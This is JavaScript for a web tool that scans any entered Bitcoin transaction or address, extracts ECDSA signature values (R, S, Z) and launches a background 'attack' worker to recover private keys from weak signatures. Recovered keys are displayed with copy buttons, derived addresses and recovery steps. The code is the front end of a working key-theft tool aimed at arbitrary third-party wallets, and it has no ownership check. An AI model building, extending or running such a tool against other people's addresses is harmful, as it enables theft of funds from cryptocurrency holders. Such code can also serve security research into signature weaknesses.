    // Delegated copy handler (attached once for the whole page)
    function fallbackCopy(text, done) {
        try {
            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta);
            done();
        } catch (e) { /* ignore */ }
    }
    document.addEventListener('click', function (ev) {
        const btn = ev.target && ev.target.closest ? ev.target.closest('.rsz-copy[data-copy]') : null;
        if (!btn) return;
        const val = btn.getAttribute('data-copy');
        const done = function () { btn.classList.add('copied'); setTimeout(function () { btn.classList.remove('copied'); }, 1200); };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(val).then(done).catch(function () { fallbackCopy(val, done); });
        } else { fallbackCopy(val, done); }
    });

    // ---- Result rendering (mirrors the site's .keys-table look) ----------
    function renderResults(rsz, input, mode) {
        if (!rsz || rsz.length === 0) {
            return '<div class="rsz-status rsz-empty">No ECDSA signatures found for this ' +
                (mode === 'address' ? 'address' : 'transaction') + '.</div>';
        }

        const vulnRows = new Set();   // R-reuse detection now runs in the background worker

        let html = '<div id="attack-result"></div>';

        // Column header
        html += '<div class="rsz-thead">';
        html += '<div><img src="../assets/svgs/solid/hashtag.svg" width="13" height="13" alt=""> Transaction ID</div>';
        html += '<div><img src="../assets/svgs/solid/key.svg" width="13" height="13" alt=""> R · S · Z</div>';
        html += '<div><img src="../assets/svgs/solid/wallet.svg" width="13" height="13" alt=""> Address · Public Key</div>';
        html += '</div>';

        // Rows
        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const txid = e.txid || (mode === 'txid' ? input.toLowerCase() : '');
            html += '<div class="rsz-row' + (vulnRows.has(idx) ? ' rsz-row-vuln' : '') + '">';

            html += '<div class="rsz-col rsz-col-txid"><span class="key-label">TXID</span>' +
                monoCell(txid, 'rsz-txid') + '</div>';

            html += '<div class="rsz-col rsz-col-rsz">' +
                rszLine('R', e.r) + rszLine('S', e.s) + rszLine('Z', e.z) + '</div>';

            html += '<div class="rsz-col rsz-col-addr">' +
                addrLine('ADDR', e.addr) + addrLine('PUB', e.pub) + '</div>';

            html += '</div>';
        }

        return html;
    }

    // ---- Main entry ------------------------------------------------------
    async function processTxid() {
        const input = document.getElementById("txid_input").value.trim();
        const out = document.getElementById("out_txid");
        if (!input) return;

        // How many transactions to scan (address mode). Free entry — any number.
        const limitEl = document.getElementById("txr-tx-limit");
        let want = limitEl ? parseInt(limitEl.value, 10) : 100;
        if (!want || want < 1) want = 100;

        const header = getOutputHeader(out.id);
        const setStatus = function (msg) {
            out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
        };
        const onProgress = function (p) {
            if (p.phase === 'list') {
                setStatus('Listing transactions… ' + p.listed + (p.target ? ' / ' + p.target : '') + ' found');
            } else {
                setStatus('Scanning transactions for R·S·Z… ' + p.scanned + ' / ' + p.target +
                    '  (signatures found: ' + p.found + ')');
            }
        };

        setStatus('Analyzing input (TXID or Address)…');

        try {
            let rsz = [];
            let mode = "";
            if (input.length === 64 && /^[0-9a-fA-F]+$/.test(input)) {
                mode = "txid";
                setStats(null);                            // a TXID isn't an address
                const rawtx = await getRawTx(input);
                const parsed = parsingRaw(rawtx);
                rsz = getrsz(parsed);
                rsz.forEach(function (e) { if (!e.txid) e.txid = input.toLowerCase(); });
            } else if (input.length >= 26) {
                mode = "address";
                // Balance / Received / TX first (fast) — same box as Address Analysis.
                setStatus('Fetching balance…');
                statLoading();
                try { setStats(await fetchAddressStats(input)); } catch (e) { setStats(null); }
                rsz = await resolveInputToRSZ(input, want, onProgress);
            } else {
                throw new Error("Invalid input. Paste a 64-character TXID or a Bitcoin address.");
            }

            out.innerHTML = header + renderResults(rsz, input, mode);
            launchAttack(rsz);
        } catch (e) {
            out.innerHTML = header +
                '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Error: ' +
                escapeHtml(e.message) + '</div>';
        }
    }

    // ---- Expose globals used by inline onclick handlers ------------------
    window.processTxid = processTxid;
    window.exportOne = exportOne;

        // Shared recovered-key box (matches the site's .rsz-vuln-box style).
        function akeyBox(pk, title, math) {
            var h = '<div class="rsz-vuln-box"><div class="rsz-vuln-title"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="15" height="15" alt=""> ' + escapeHtml(title) + '</div>';
            h += '<div class="rsz-vuln-key"><span class="key-label">Private key (correct value)</span><span class="private-key">' + escapeHtml(pk) + '</span>' + copyBtn(pk) + '</div>';
            if (math && math.length) {
                h += '<div class="rsz-leak-bits"><strong>How this key was recovered (mathematical method):</strong></div>';
                for (var mi = 0; mi < math.length; mi++) {
                    h += '<div class="rsz-line"><span class="rsz-tag">Step ' + (mi + 1) + '</span><code class="rsz-val">' + escapeHtml(math[mi]) + '</code></div>';
                }
            }
            try {
                var chain = activeChain();
                var info = chainInfo(chain);
                var addrs = chainAddressesFromPriv(pk, chain);
                if (info.kind === 'ed25519') {
                    h += '<div class="rsz-leak-bits">' + escapeHtml(info.name) + ' uses Ed25519 \\u2014 switch to a secp256k1 chain tab to see its address.</div>';
                } else if (addrs && addrs.length) {
                    for (var ai = 0; ai < addrs.length; ai++) {
                        h += '<div class="rsz-line"><span class="rsz-tag">' + escapeHtml(info.name) + ' addr' + (addrs.length > 1 ? ' #' + (ai + 1) : '') + '</span><code class="rsz-val rsz-addr-val">' + escapeHtml(addrs[ai]) + '</code>' + copyBtn(addrs[ai]) + '</div>';
                    }
                }
            } catch (e) {}
            h += '</div>';
            return h;
        }

    // ---- background worker attack (calculation never freezes the page) ----
        function launchAttack(rsz) {
        var host = document.getElementById('attack-result');
        if (!host || !rsz || !rsz.length) { if (host) host.innerHTML = '<div class="rsz-status">No signatures to analyze.</div>'; return; }
        var logLines = ['Analyzing ' + rsz.length + ' signatures in a background worker...'];
        host.innerHTML = '<div class="rsz-status" id="attack-status">' + spinner(14) + ' Analyzing ' + rsz.length + ' signatures...</div>' +
            '<div class="attack-log-wrap"><pre class="attack-log" id="attack-log">' + escapeHtml(logLines.join('\n')) + '</pre></div>';
        var logEl = document.getElementById('attack-log');
        var st = document.getElementById('attack-status');
        function log(msg) {
            logLines.push(msg);
            if (logEl) { logEl.textContent = logLines.join('\n'); logEl.scrollTop = logEl.scrollHeight; }
        }
        var worker;
        try { worker = new Worker('/assets/js/attack-worker.js?v=20261005'); }
        catch (e) { host.innerHTML = '<div class="rsz-error">Web Worker unavailable: ' + escapeHtml(e.message || e) + '</div>'; return; }
        var TOOL = 'truncated';
        worker.onmessage = function (ev) {
            var d = ev.data;
            if (!d) return;
            if (d.type === 'progress') {
                if (st) st.innerHTML = spinner(14) + ' ' + escapeHtml(d.msg);
                log(d.msg);
            } else if (d.type === 'done') {
                var html = '';
                if (d.recovered && d.recovered.length) {
                    d.recovered.forEach(function (r) { html += akeyBox(r.pk, r.title, r.math); });
                } else {
                    html = '<div class="rsz-status">' + escapeHtml(d.message) + '</div>';
                }
                html += '<details class="attack-log-details"><summary>Process log (' + logLines.length + ' steps)</summary><pre class="attack-log">' + escapeHtml(logLines.join('\n')) + '</pre></details>';
                host.innerHTML = html;
                worker.terminate();
            }
        };
        worker.onerror = function (e) { host.innerHTML = '<div class="rsz-error">Worker error: ' + escapeHtml((e && e.message) || 'unknown') + '</div>'; };
        var payload = rsz.map(function (s) { return { r: s.r, s: s.s, z: s.z, pub: s.pub || '' }; });
        worker.postMessage({ tool: TOOL, sigs: payload });
    }

})();
